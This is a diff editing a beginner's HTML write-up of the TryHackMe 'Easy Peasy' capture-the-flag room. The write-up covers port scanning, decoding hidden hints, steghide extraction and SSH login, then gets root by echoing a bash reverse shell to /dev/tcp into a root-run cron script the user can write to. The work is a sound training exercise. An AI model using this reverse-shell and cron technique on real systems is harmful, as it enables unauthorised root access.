@@ -68,14 +68,14 @@
   <div class="container">
     <h1>TryHackMe | <a href=https://tryhackme.com/room/easypeasyctf>Easy Peasy</a> Write-up</h1>
 
-    <p>Welcome to my write-up for Easy Peasy on TryHackMe! I'm just getting started with CTFs, so this is less of a tutorial and more of a “let's SUFFER together” kind of deal. But you know what they say:<br>NO PAIN, NO GAIN!! 🗣️🔥</p>
+    <p>Welcome to my write-up for Easy Peasy on TryHackMe! This is my first write-up so let's start the suffering together.</p>
 
     <p><strong>Task 1 : Enumeration through Nmap</strong></p>
 
     <p>First, let's run a quick Nmap scan on the target IP.</p>
 
     <img src="writeups/p1.png" alt="pic1">
-    <p>Only one port was open. But when I submitted that as the answer, it marked me wrong. So let's run a more thorough scan this time...</p>
+    <p>Only one port was open. But when I submitted that as the answer, it marked me wrong. So let's run a more thorough full-scan this time...</p>
 
     <img src="writeups/p2.png" alt="pic2">
     <ul>
@@ -111,7 +111,7 @@
   <img src="writeups/p10.png" alt="pic10">
   <p>The question hinted that there is a hidden directory, so I used gobuster to check, but no new directory was found, strange....</p>
   <img src="writeups/p13.png" alt="pic13">
-  <p>Let's check the page source again to find any hints. And there is an encoded text between the paragraphs, which is also hinted that it was encoded with ba.....</p>
+  <p>Let's check the page source again to find any hints. And there is an encoded text between the paragraphs, which is also hinted that it was encoded with "ba....".</p>
   <img src="writeups/p11.png" alt="pic11">
   <p> I tried base64 but it doesn't work. So I find another Online Base X <a href="https://www.toolhelper.cn/en/EncodeDecode/Base"> Encoder/Decoder</a> and tried base62. It reveals a message, which could be a hidden directory based on the question.</p>
   <img src="writeups/p12.png" alt="pic12">
@@ -121,13 +121,14 @@
   <p>I can't decode it with MD5 decoder...But the question hinted that it's a Gost hash, so I decoded it with Gost decoder from <a href="https://md5hashing.net/hash/gost">MD5hashing.net</a>.</p>
   <p>(I did not notice the "easypeasy.txt" in the room at the time, which would have saved me so much time if used with john the ripper. But anyway, we got the password.)</p>
   <img src="writeups/p15.png" alt="pic15">
-  <p>Checking the page source again, the small image is named "binarycodebixabay.jpg", hmmm "binarycode" huh? suspecious, it could be a binary encoded message. Let's download and inspect it.</p>
+  <p>Checking the page source again, the small image is named "binarycodebixabay.jpg", hmmm "binarycode" huh? suspecious, it could contain a binary encoded message. Let's download and inspect it.</p>
   <p>Download the image with "wget -http://target-ip:65524//n0th1ng3ls3m4tt3r/binarycodebixabay.jpg".</p>
   <p>And ran steghide : "steghide extract -sf binarycodebixabay.jpg" to extract any possible hidden codes using the previous discovered passcode.</p>
   <img src="writeups/p17.png" alt="pic17">
   <img src="writeups/p18.png" alt="pic18">
   <p>We get the username 'boring' and a binary encoded password, let's decode the password in an online decoder.</p>
   <img src="writeups/p16.png" alt="pic16">
+  <p>And we get the password!</p>
   <p>At the very start, when we scanned the target with nmap, we know that there is a ssh service running on port 6498. Since we now have the username and password, let's login the machine.<br>ssh username@target-ip -p port</p>
   <img src="writeups/p19.png" alt="pic19">
   <p>And....we are in! I started with listing out the files and directory with ls command. And there is a single text file so I cat it out.</p>
@@ -136,9 +137,9 @@
   <img src="writeups/p21.png" alt="pic21">
   <p>And for the final question, we need the root flag. I ran sudo -l to check the permissions of user boring, and it shows that user boring doesn't have permission to run sudo.<br> Let's check the crontab. It's a common place to find hidden persistence in ctf challenges.</p>
   <img src="writeups/p22.png" alt="pic22">
-  <p>We change the directory to /var/www and cat out the "mysecretcrontab.sh", and it is running as root, and is also writeable by user boring. That's a perfect place to set up a reverse shell. I copied a bash reverse shell : ash -i >& /dev/tcp/your-ip/listener-port 0>&1 and echo it into "mysecretcrontab.sh". I used 8585 for the port.</p>
+  <p>We change the directory to /var/www and cat out the "mysecretcrontab.sh", and it is running as root, and is also writeable by user boring. That's a perfect place to set up a reverse shell. I copied a bash reverse shell fron <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey</a> : bash -i >& /dev/tcp/your-ip/listener-port 0>&1 and echo it into "mysecretcrontab.sh". I used 8585 for the port.</p>
   <img src="writeups/p23.png" alt="pic23">
-  <p>Quickly open a new terminal and set up the listener with the same port, which soon enough, was connected by the target machine. Now we are root of the target machine.</p>
+  <p>Quickly open a new terminal and set up a listener with the same port :8585, which soon enough, was connected by the target machine. Now we are root of the target machine.</p>
   <img src="writeups/p24.png" alt="pic24">
   <p>Start with ls -la/root to check all the directory and files in /root directory. And now we can cat out the .root.txt from the /root directory (ignore my panic typos lmao).</p>
   <img src="writeups/p25.png" alt="pic25">
